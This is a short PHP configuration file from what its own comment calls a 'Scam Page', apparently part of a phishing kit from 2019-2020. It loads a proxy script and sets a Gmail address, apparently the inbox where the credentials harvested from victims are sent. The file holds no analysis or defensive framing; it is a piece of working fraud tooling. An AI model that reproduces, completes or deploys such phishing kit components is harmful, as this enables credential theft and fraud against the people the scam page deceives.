<?php
// Scam Page Created by Mr.fnetwork <3 | 2019-2020
 // Your Mail :
require_once('../../proxy.php');

  $EX445093_REMOT = "helver0909@gmail.com";
?>